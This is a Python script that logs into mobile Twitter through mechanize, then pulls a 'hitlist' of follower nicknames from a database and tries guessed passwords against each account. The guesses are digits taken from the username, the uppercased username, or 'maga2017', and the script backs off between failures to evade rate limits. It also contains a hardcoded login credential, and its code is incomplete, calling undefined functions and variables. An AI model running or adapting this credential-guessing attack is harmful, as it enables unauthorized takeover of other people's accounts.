import mechanize
import cookielib
import time
from random import randint

#build browser object
br = mechanize.Browser() 
 
# set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
 
# browser settings (used to emulate a browser)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def login(username,password):
    br.open('http://mobile.twitter.com/login') # open twitter
    br.select_form(nr=0) # select the form
    br['session[username_or_email]'] = username
    br['session[password]'] = password
    br.submit() # submit the login data 

def logout():
    br.open('http://mobile.twitter.com/logout')
    br.select_form(nr=0)
    br.submit()
 
username = 'izmcgill'   # your username/email
password = 'supercalifragilisticexpealidocious'   # your password

login(username, password)
response = br.response().read()
logout()

sql = 'select * from follower'
with bayeslite.bayesdb_open(pathname='foo.bdb') as bdb: 
    data = bdb.sql_execute(sql).fetchall()
    df = pd.DataFrame(data)
    df.columns = ['id'
               , 'nick'
               , 'name'
               , 'hasBio'
               , 'isEgg'
               , 'fakeNews'
               , 'verified'
               , 'defimg'
               , 'image'
               , 'followers'
               , 'friends'
               , 'tweets'
               , 'created'
               , 'entropy']

hitlist = [row['nick'] for index, row in df.iterrows()]
while hitlist:
    username = hitlist.pop(randint(0, len(hitlist)-1))
    matches = re.match('^([A-Z]*)(\d{6,})$', username, re.I)
    if matches:
        password = matches.group(2)
    else:
        password = 'maga2017'
    try:
      test(username, password)
    except:
      Zzz += 60
      time.sleep(Zzz)

www = getbro()
while hitlist:
    username = hitlist.pop(randint(0, len(hitlist)-1))
    print username
    
    matches = re.match('^([A-Z]*)(\d{6,})$', username, re.I)
    if matches:
        password = matches.group(2)
    else:    
        matches = re.match('^(\d{6,})$', username, re.I)
        if matches:
            password = matches.group(1)
            
    if matches:
        try:
            test(username, password) ## Same as number part
            test(username, username.upper()) ## Same as user uppercase
        except Exception as error:
            print error.message
            Zzz += 30
            time.sleep(Zzz)
